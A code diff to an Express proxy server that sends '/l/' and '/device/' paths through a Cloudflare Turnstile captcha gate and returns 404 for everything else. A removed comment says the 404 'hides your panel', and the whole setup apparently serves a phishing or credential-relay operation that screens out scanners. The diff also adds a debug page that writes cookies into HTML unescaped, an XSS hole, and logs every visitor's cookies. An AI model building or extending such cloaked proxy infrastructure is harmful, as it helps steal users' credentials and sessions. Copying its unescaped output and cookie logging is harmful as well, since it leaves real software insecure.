@@ -12,6 +12,16 @@ app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 app.use(cookieParser());
 
+// ---- DEBUG PAGE ----
+app.get('/debug', (req, res) => {
+    res.send(`
+        <h1>Debug</h1>
+        <p>Cookies: ${JSON.stringify(req.cookies)}</p>
+        <p>captcha_passed: ${req.cookies.captcha_passed ? 'YES' : 'NO'}</p>
+        <p><a href="/">Home</a></p>
+    `);
+});
+
 // ---- CAPTCHA PAGE ----
 app.get('/captcha', (req, res) => {
     let returnPath = req.query.return || '/';
@@ -28,10 +38,11 @@ app.get('/device/*', (req, res) => {
     res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
 });
 
-// ---- PROXY ONLY FOR /l/ AND /device/ (check cookie) ----
+// ---- PROXY WITH LOGGING ----
 app.use('/l/*', async (req, res) => {
-    // Cookie is now set by JavaScript, so we just check it
+    console.log('Cookies received:', req.cookies); // Log to Render logs
     if (!req.cookies.captcha_passed) {
+        console.log('Cookie missing, redirecting to CAPTCHA');
         return res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
     }
     try {
@@ -64,14 +75,13 @@ app.use('/device/*', async (req, res) => {
     }
 });
 
-// ---- ALL OTHER PATHS – 404 (hides your panel) ----
+// ---- ALL OTHER PATHS – 404 ----
 app.use('*', (req, res) => {
     res.status(404).send('Not Found');
 });
 
 app.listen(port, () => console.log('✅ Proxy running on port ' + port));
 
-// ---- CAPTCHA HTML (sets cookie via JavaScript) ----
 function getCaptchaHTML(siteKey, returnPath) {
     return `
 <!DOCTYPE html>
@@ -82,7 +92,6 @@ function getCaptchaHTML(siteKey, returnPath) {
   <title>Verify</title>
   <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onTurnstileLoad" async defer></script>
   <style>
-    /* Your existing CSS here */
     body { font-family: 'Segoe UI', sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
     .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
     #cf-turnstile { display: flex; justify-content: center; margin: 20px 0; }
@@ -92,7 +101,6 @@ function getCaptchaHTML(siteKey, returnPath) {
 </head>
 <body>
   <div class="container">
-    <!-- Your logo animation HTML (keep as is) -->
     <div id="loadingLogo"> ... </div>
     <div id="dp"></div>
     <div id="cf-turnstile"></div>
@@ -113,9 +121,7 @@ function getCaptchaHTML(siteKey, returnPath) {
 
     function turnstileCallback(token) {
         if (token) {
-            // Set cookie client-side
             setCookie('captcha_passed', 'true', 5);
-            // Redirect to the original path
             window.location.href = returnPath;
         }
     }
